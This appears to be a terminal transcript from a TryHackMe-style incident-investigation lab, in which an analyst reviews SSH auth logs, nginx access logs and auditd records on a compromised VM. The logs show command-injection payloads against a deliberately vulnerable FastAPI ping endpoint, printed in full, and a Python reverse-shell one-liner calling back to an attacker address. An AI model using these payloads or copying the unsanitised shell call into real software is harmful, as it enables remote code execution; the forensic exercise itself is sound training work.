@@ -1,0 +1,253 @@
+(white㉿white)-[~/Documents]
+└─$ ssh ubuntu@10.49.189.39 
+The authenticity of host '10.49.189.39 (10.49.189.39)' can't be established.
+ED25519 key fingerprint is: SHA256:3rqgwweblqS2HTkQYxD6KvBv8Ej7Od+jn3agwbT56wI
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.49.189.39' (ED25519) to the list of known hosts.
+ubuntu@10.49.189.39's password: 
+Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1011-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue Jun 23 03:34:31 UTC 2026
+
+  System load:  0.63               Temperature:           -273.1 C
+  Usage of /:   17.8% of 19.31GB   Processes:             122
+  Memory usage: 26%                Users logged in:       0
+  Swap usage:   0%                 IPv4 address for ens5: 10.49.189.39
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Jun 23 03:34:33 2026 from 10.49.75.118
+ubuntu@thm-vm:~$ cd /
+ubuntu@thm-vm:/$ cd /var/log
+ubuntu@thm-vm:/var/log$ ls
+README                 dmesg       nginx
+alternatives.log       dmesg.0     private
+amazon                 dmesg.1.gz  syslog
+apport.log             dmesg.2.gz  sysstat
+apt                    dmesg.3.gz  ubuntu-advantage-apt-hook.log
+audit                  dmesg.4.gz  ubuntu-advantage.log
+auth.log               dpkg.log    unattended-upgrades
+btmp                   journal     upgrade
+cloud-init-output.log  kern.log    wtmp
+cloud-init.log         landscape
+dist-upgrade           lastlog
+ubuntu@thm-vm:/var/log$ cat auth.log | grep Accepted
+Oct 22 08:28:00 ip-10-10-249-101 sshd[809]: Accepted publickey for ubuntu from 10.9.254.186 port 64824 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:28:00 ip-10-10-249-101 sshd[869]: Accepted publickey for ubuntu from 10.9.254.186 port 64825 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:33:12 ip-10-10-249-101 sshd[740]: Accepted publickey for ubuntu from 10.9.254.186 port 65053 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:33:12 ip-10-10-249-101 sshd[749]: Accepted publickey for ubuntu from 10.9.254.186 port 65054 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:37:32 ip-10-10-249-101 sshd[745]: Accepted publickey for ubuntu from 10.9.254.186 port 65220 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:37:33 ip-10-10-249-101 sshd[763]: Accepted publickey for ubuntu from 10.9.254.186 port 65221 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:55:24 ip-10-10-249-101 sshd[702]: Accepted publickey for ubuntu from 10.9.254.186 port 49543 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:55:25 ip-10-10-249-101 sshd[704]: Accepted publickey for ubuntu from 10.9.254.186 port 49544 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:09:06.968340+00:00 ip-10-10-249-101 sshd[839]: Accepted publickey for ubuntu from 10.9.254.186 port 50136 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:09:07.320625+00:00 ip-10-10-249-101 sshd[841]: Accepted publickey for ubuntu from 10.9.254.186 port 50142 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:13:00.337519+00:00 tryhackme-2404 sshd[877]: Accepted publickey for ubuntu from 10.9.254.186 port 50303 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:13:00.656774+00:00 tryhackme-2404 sshd[879]: Accepted publickey for ubuntu from 10.9.254.186 port 50305 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2025-08-21T14:31:44.814918+00:00 tryhackme-2404 sshd[1013]: Accepted publickey for ubuntu from 10.14.105.255 port 18442 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-21T15:22:17.752969+00:00 thm-vm sshd[948]: Accepted publickey for ubuntu from 10.14.105.255 port 33903 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-21T17:10:08.113644+00:00 thm-vm sshd[16876]: Accepted password for root from 91.224.92.79 port 51555 ssh2
+2025-08-21T17:13:32.532020+00:00 thm-vm sshd[18559]: userauth_pubkey: signature algorithm ssh-rsa not in PubkeyAcceptedAlgorithms [preauth]
+2025-08-28T11:51:48.242199+00:00 thm-vm sshd[1209]: Accepted publickey for ubuntu from 10.14.105.255 port 12199 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-28T11:56:49.482146+00:00 thm-vm sshd[1427]: Accepted publickey for ubuntu from 10.14.105.255 port 51753 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-28T12:20:48.161178+00:00 thm-vm sshd[1611]: Accepted publickey for ubuntu from 10.14.105.255 port 31785 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-09-02T19:19:32.273999+00:00 thm-vm sshd[1014]: Accepted publickey for ubuntu from 10.14.105.255 port 19012 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-09-10T19:14:44.261800+00:00 thm-vm sshd[966]: Accepted publickey for ubuntu from 10.14.105.255 port 28815 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2026-06-23T03:34:30.392071+00:00 thm-vm sshd[884]: Accepted password for ubuntu from 10.49.75.118 port 33024 ssh2
+2026-06-23T03:35:15.998404+00:00 thm-vm sshd[1273]: Accepted password for ubuntu from 192.168.129.141 port 39142 ssh2
+ubuntu@thm-vm:/var/log$ cat auth.log | grep -i failed
+Oct 22 08:36:55 ip-10-10-249-101 sshd[740]: pam_systemd(sshd:session): Failed to release session: Interrupted system call
+2025-08-21T16:34:04.201269+00:00 thm-vm sshd[18432]: Failed password for root from 197.39.195.136 port 47942 ssh2
+2025-08-21T16:38:47.168117+00:00 thm-vm sshd[18479]: Failed password for invalid user sol from 193.32.162.145 port 46702 ssh2
+2025-08-21T16:39:54.526886+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
+2025-08-21T16:39:58.381234+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
+2025-08-21T16:40:02.099936+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
+2025-08-21T16:40:06.684926+00:00 thm-vm sshd[18486]: Failed password for root from 193.46.255.33 port 62166 ssh2
+2025-08-21T16:40:14.054516+00:00 thm-vm sshd[18486]: message repeated 2 times: [ Failed password for root from 193.46.255.33 port 62166 ssh2]
+2025-08-21T16:40:18.831953+00:00 thm-vm sshd[18488]: Failed password for root from 193.46.255.33 port 43344 ssh2
+2025-08-21T16:40:23.021683+00:00 thm-vm sshd[18488]: Failed password for root from 193.46.255.33 port 43344 ssh2
+2025-08-21T16:40:23.214423+00:00 thm-vm sshd[18490]: Failed password for root from 45.88.8.186 port 34026 ssh2
+2025-08-21T16:40:26.207263+00:00 thm-vm sshd[18488]: Failed password for root from 193.46.255.33 port 43344 ssh2
+2025-08-21T16:41:06.828985+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
+2025-08-21T16:41:11.599255+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
+2025-08-21T16:41:15.906661+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
+2025-08-21T16:41:18.468868+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
+2025-08-21T16:41:20.881476+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
+2025-08-21T16:46:50.163525+00:00 thm-vm sshd[18503]: Failed password for root from 80.94.93.233 port 46416 ssh2
+2025-08-21T16:46:57.398313+00:00 thm-vm sshd[18503]: message repeated 2 times: [ Failed password for root from 80.94.93.233 port 46416 ssh2]
+2025-08-21T16:47:02.345662+00:00 thm-vm sshd[18505]: Failed password for root from 80.94.93.233 port 49998 ssh2
+2025-08-21T16:47:09.592447+00:00 thm-vm sshd[18505]: message repeated 2 times: [ Failed password for root from 80.94.93.233 port 49998 ssh2]
+2025-08-21T16:47:14.547534+00:00 thm-vm sshd[18507]: Failed password for root from 80.94.93.233 port 22588 ssh2
+2025-08-21T16:47:22.129207+00:00 thm-vm sshd[18507]: message repeated 2 times: [ Failed password for root from 80.94.93.233 port 22588 ssh2]
+2025-08-21T16:53:50.170818+00:00 thm-vm sshd[18516]: Failed password for root from 80.94.93.119 port 59598 ssh2
+2025-08-21T16:53:57.405045+00:00 thm-vm sshd[18516]: message repeated 2 times: [ Failed password for root from 80.94.93.119 port 59598 ssh2]
+2025-08-21T16:54:02.351411+00:00 thm-vm sshd[18518]: Failed password for root from 80.94.93.119 port 11606 ssh2
+2025-08-21T16:54:09.398051+00:00 thm-vm sshd[18518]: message repeated 2 times: [ Failed password for root from 80.94.93.119 port 11606 ssh2]
+2025-08-21T16:54:14.347754+00:00 thm-vm sshd[18520]: Failed password for root from 80.94.93.119 port 61456 ssh2
+2025-08-21T16:54:21.260695+00:00 thm-vm sshd[18520]: message repeated 2 times: [ Failed password for root from 80.94.93.119 port 61456 ssh2]
+2025-08-21T17:00:43.570528+00:00 thm-vm sshd[18530]: Failed password for root from 193.46.255.20 port 31716 ssh2
+2025-08-21T17:00:49.607100+00:00 thm-vm sshd[18530]: message repeated 2 times: [ Failed password for root from 193.46.255.20 port 31716 ssh2]
+2025-08-21T17:00:53.826091+00:00 thm-vm sshd[18532]: Failed password for root from 193.46.255.20 port 59390 ssh2
+2025-08-21T17:01:00.045858+00:00 thm-vm sshd[18532]: message repeated 2 times: [ Failed password for root from 193.46.255.20 port 59390 ssh2]
+2025-08-21T17:01:04.991390+00:00 thm-vm sshd[18534]: Failed password for root from 193.46.255.20 port 42988 ssh2
+2025-08-21T17:01:12.237121+00:00 thm-vm sshd[18534]: message repeated 2 times: [ Failed password for root from 193.46.255.20 port 42988 ssh2]
+2025-08-21T17:03:52.453079+00:00 thm-vm sshd[18538]: Failed password for root from 45.88.8.186 port 33900 ssh2
+2025-08-21T17:06:23.687748+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
+2025-08-21T17:06:26.887120+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
+2025-08-21T17:06:30.901655+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
+2025-08-21T17:06:33.443041+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
+2025-08-21T17:06:37.120015+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
+2025-08-21T17:07:44.103207+00:00 thm-vm sshd[18547]: Failed password for root from 91.224.92.79 port 41398 ssh2
+2025-08-21T17:07:51.991479+00:00 thm-vm sshd[18547]: message repeated 2 times: [ Failed password for root from 91.224.92.79 port 41398 ssh2]
+2025-08-21T17:07:55.863469+00:00 thm-vm sshd[18549]: Failed password for root from 91.224.92.79 port 50788 ssh2
+2025-08-21T17:08:00.870866+00:00 thm-vm sshd[18549]: message repeated 2 times: [ Failed password for root from 91.224.92.79 port 50788 ssh2]
+2025-08-21T17:08:05.270529+00:00 thm-vm sshd[18551]: Failed password for root from 91.224.92.79 port 50408 ssh2
+2025-08-21T17:08:09.952907+00:00 thm-vm sshd[18551]: message repeated 2 times: [ Failed password for root from 91.224.92.79 port 50408 ssh2]
+2025-08-21T17:14:43.872813+00:00 thm-vm sshd[18562]: Failed password for root from 193.46.255.159 port 57542 ssh2
+2025-08-21T17:14:48.550105+00:00 thm-vm sshd[18562]: message repeated 2 times: [ Failed password for root from 193.46.255.159 port 57542 ssh2]
+2025-08-21T17:14:53.193509+00:00 thm-vm sshd[18576]: Failed password for root from 193.46.255.159 port 63574 ssh2
+2025-08-21T17:14:58.431517+00:00 thm-vm sshd[18576]: message repeated 2 times: [ Failed password for root from 193.46.255.159 port 63574 ssh2]
+2025-08-21T17:15:03.726732+00:00 thm-vm sshd[18579]: Failed password for root from 193.46.255.159 port 41378 ssh2
+2025-08-21T17:15:09.099703+00:00 thm-vm sshd[18579]: message repeated 2 times: [ Failed password for root from 193.46.255.159 port 41378 ssh2]
+2025-08-21T17:21:46.715903+00:00 thm-vm sshd[18598]: Failed password for root from 193.46.255.7 port 36766 ssh2
+2025-08-21T17:21:54.098687+00:00 thm-vm sshd[18598]: message repeated 2 times: [ Failed password for root from 193.46.255.7 port 36766 ssh2]
+2025-08-21T17:21:58.688779+00:00 thm-vm sshd[18600]: Failed password for root from 193.46.255.7 port 17414 ssh2
+2025-08-21T17:22:04.581870+00:00 thm-vm sshd[18600]: message repeated 2 times: [ Failed password for root from 193.46.255.7 port 17414 ssh2]
+2025-08-21T17:22:09.202252+00:00 thm-vm sshd[18602]: Failed password for root from 193.46.255.7 port 23380 ssh2
+2025-08-21T17:22:13.896906+00:00 thm-vm sshd[18602]: message repeated 2 times: [ Failed password for root from 193.46.255.7 port 23380 ssh2]
+2026-06-23T03:35:14.009191+00:00 thm-vm sshd[1273]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys ubuntu SHA256:eilD1YtOXVrptHfmsdDN/R34X0EvXHPTsK813c6S2F8 failed, status 22
+ubuntu@thm-vm:/var/log$ cat auth.log | grep Accepted
+Oct 22 08:28:00 ip-10-10-249-101 sshd[809]: Accepted publickey for ubuntu from 10.9.254.186 port 64824 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:28:00 ip-10-10-249-101 sshd[869]: Accepted publickey for ubuntu from 10.9.254.186 port 64825 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:33:12 ip-10-10-249-101 sshd[740]: Accepted publickey for ubuntu from 10.9.254.186 port 65053 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:33:12 ip-10-10-249-101 sshd[749]: Accepted publickey for ubuntu from 10.9.254.186 port 65054 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:37:32 ip-10-10-249-101 sshd[745]: Accepted publickey for ubuntu from 10.9.254.186 port 65220 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:37:33 ip-10-10-249-101 sshd[763]: Accepted publickey for ubuntu from 10.9.254.186 port 65221 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:55:24 ip-10-10-249-101 sshd[702]: Accepted publickey for ubuntu from 10.9.254.186 port 49543 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+Oct 22 08:55:25 ip-10-10-249-101 sshd[704]: Accepted publickey for ubuntu from 10.9.254.186 port 49544 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:09:06.968340+00:00 ip-10-10-249-101 sshd[839]: Accepted publickey for ubuntu from 10.9.254.186 port 50136 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:09:07.320625+00:00 ip-10-10-249-101 sshd[841]: Accepted publickey for ubuntu from 10.9.254.186 port 50142 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:13:00.337519+00:00 tryhackme-2404 sshd[877]: Accepted publickey for ubuntu from 10.9.254.186 port 50303 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2024-10-22T09:13:00.656774+00:00 tryhackme-2404 sshd[879]: Accepted publickey for ubuntu from 10.9.254.186 port 50305 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
+2025-08-21T14:31:44.814918+00:00 tryhackme-2404 sshd[1013]: Accepted publickey for ubuntu from 10.14.105.255 port 18442 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-21T15:22:17.752969+00:00 thm-vm sshd[948]: Accepted publickey for ubuntu from 10.14.105.255 port 33903 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-21T17:10:08.113644+00:00 thm-vm sshd[16876]: Accepted password for root from 91.224.92.79 port 51555 ssh2
+2025-08-21T17:13:32.532020+00:00 thm-vm sshd[18559]: userauth_pubkey: signature algorithm ssh-rsa not in PubkeyAcceptedAlgorithms [preauth]
+2025-08-28T11:51:48.242199+00:00 thm-vm sshd[1209]: Accepted publickey for ubuntu from 10.14.105.255 port 12199 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-28T11:56:49.482146+00:00 thm-vm sshd[1427]: Accepted publickey for ubuntu from 10.14.105.255 port 51753 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-08-28T12:20:48.161178+00:00 thm-vm sshd[1611]: Accepted publickey for ubuntu from 10.14.105.255 port 31785 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-09-02T19:19:32.273999+00:00 thm-vm sshd[1014]: Accepted publickey for ubuntu from 10.14.105.255 port 19012 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2025-09-10T19:14:44.261800+00:00 thm-vm sshd[966]: Accepted publickey for ubuntu from 10.14.105.255 port 28815 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
+2026-06-23T03:34:30.392071+00:00 thm-vm sshd[884]: Accepted password for ubuntu from 10.49.75.118 port 33024 ssh2
+2026-06-23T03:35:15.998404+00:00 thm-vm sshd[1273]: Accepted password for ubuntu from 192.168.129.141 port 39142 ssh2
+ubuntu@thm-vm:/var/log$ cat /var/log/nginx/access.log |grep .py
+10.14.105.255 - - [26/Aug/2025:20:10:49 +0000] "GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1" 200 330 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+10.14.105.255 - - [26/Aug/2025:20:12:16 +0000] "GET /ping?host=;python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.14.105.255%22%2C1337%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27 HTTP/1.1" 504 578 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+ubuntu@thm-vm:/var/log$ cat opt/trypingme/main.py
+cat: opt/trypingme/main.py: No such file or directory
+ubuntu@thm-vm:/var/log$ cat /opt/trypingme/main.py
+"""
+Welcome to TryPingMe app (version 0.0.1)!
+This is just a draft, sorry for the bad code
+
+Dev Team
+"""
+
+
+import subprocess
+
+import uvicorn
+from fastapi import FastAPI
+from fastapi.responses import HTMLResponse
+
+app = FastAPI()
+
+
+@app.get("/ping", response_class=HTMLResponse)
+def ping(host: str):
+
+    # TODO: Add security checks
+    # THM{i_am_vulnerable!}
+    cmd = f"ping -c 2 {host}"
+    result = subprocess.check_output(cmd, shell=True)
+    response = f"<h3>Checking the host: {host}</h3>\n"
+    response += f"<pre>{result.decode()}</pre>"
+    return response
+
+
+if __name__ == "__main__":
+    uvicorn.run(app)
+ubuntu@thm-vm:/var/log$  ausearch -i -x whoami
+Error opening config file (Permission denied)
+NOTE - using built-in logs: /var/log/audit/audit.log
+----
+type=PROCTITLE msg=audit(08/26/25 20:09:49.742:158) : proctitle=whoami 
+type=CWD msg=audit(08/26/25 20:09:49.742:158) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:09:49.742:158) : argc=1 a0=whoami 
+type=SYSCALL msg=audit(08/26/25 20:09:49.742:158) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x57c312f7e650 a1=0x57c312f7e5d8 a2=0x57c312f7e5e8 a3=0x8 items=2 ppid=1018 pid=1020 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=whoami exe=/usr/bin/whoami subj=unconfined key=exec 
+ubuntu@thm-vm:/var/log$ ausearch -i --pid 1018
+Error opening config file (Permission denied)
+NOTE - using built-in logs: /var/log/audit/audit.log
+----
+type=PROCTITLE msg=audit(08/26/25 20:09:49.738:156) : proctitle=/bin/sh -c ping -c 2 ;whoami 
+type=CWD msg=audit(08/26/25 20:09:49.738:156) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:09:49.738:156) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;whoami 
+type=SYSCALL msg=audit(08/26/25 20:09:49.738:156) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e636870 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1018 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+ubuntu@thm-vm:/var/log$ ausearch -i --ppid 577
+Error opening config file (Permission denied)
+NOTE - using built-in logs: /var/log/audit/audit.log
+----
+type=PROCTITLE msg=audit(08/26/25 20:09:43.003:152) : proctitle=/bin/sh -c ping -c 2 hello 
+type=CWD msg=audit(08/26/25 20:09:43.003:152) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:09:43.003:152) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 hello 
+type=SYSCALL msg=audit(08/26/25 20:09:43.003:152) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797a0 a1=0x7ef53e636410 a2=0x7ffeb1260660 a3=0x7ef5406148a8 items=2 ppid=577 pid=1014 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+----
+type=PROCTITLE msg=audit(08/26/25 20:09:46.269:154) : proctitle=/bin/sh -c ping -c 2 whoami 
+type=CWD msg=audit(08/26/25 20:09:46.269:154) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:09:46.269:154) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 whoami 
+type=SYSCALL msg=audit(08/26/25 20:09:46.269:154) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797c0 a1=0x7ef53e636790 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1016 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+----
+type=PROCTITLE msg=audit(08/26/25 20:09:49.738:156) : proctitle=/bin/sh -c ping -c 2 ;whoami 
+type=CWD msg=audit(08/26/25 20:09:49.738:156) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:09:49.738:156) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;whoami 
+type=SYSCALL msg=audit(08/26/25 20:09:49.738:156) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e636870 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1018 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+----
+type=PROCTITLE msg=audit(08/26/25 20:10:41.618:159) : proctitle=/bin/sh -c ping -c 2 ;ls 
+type=CWD msg=audit(08/26/25 20:10:41.618:159) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:10:41.618:159) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;ls 
+type=SYSCALL msg=audit(08/26/25 20:10:41.618:159) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e6368b0 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1021 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+----
+type=PROCTITLE msg=audit(08/26/25 20:10:45.230:162) : proctitle=/bin/sh -c ping -c 2 ;pwd 
+type=CWD msg=audit(08/26/25 20:10:45.230:162) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:10:45.230:162) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;pwd 
+type=SYSCALL msg=audit(08/26/25 20:10:45.230:162) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e636870 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1024 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+----
+type=PROCTITLE msg=audit(08/26/25 20:10:49.169:164) : proctitle=/bin/sh -c ping -c 2 ;cat /opt/trypingme/main.py 
+type=CWD msg=audit(08/26/25 20:10:49.169:164) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:10:49.169:164) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;cat /opt/trypingme/main.py 
+type=SYSCALL msg=audit(08/26/25 20:10:49.169:164) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e6368b0 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1026 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+----
+type=PROCTITLE msg=audit(08/26/25 20:11:16.022:167) : proctitle=/bin/sh -c ping -c 2 ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10. 
+type=CWD msg=audit(08/26/25 20:11:16.022:167) : cwd=/opt/trypingme 
+type=EXECVE msg=audit(08/26/25 20:11:16.022:167) : argc=3 a0=/bin/sh a1=-c a2=ping -c 2 ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.105.255",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' 
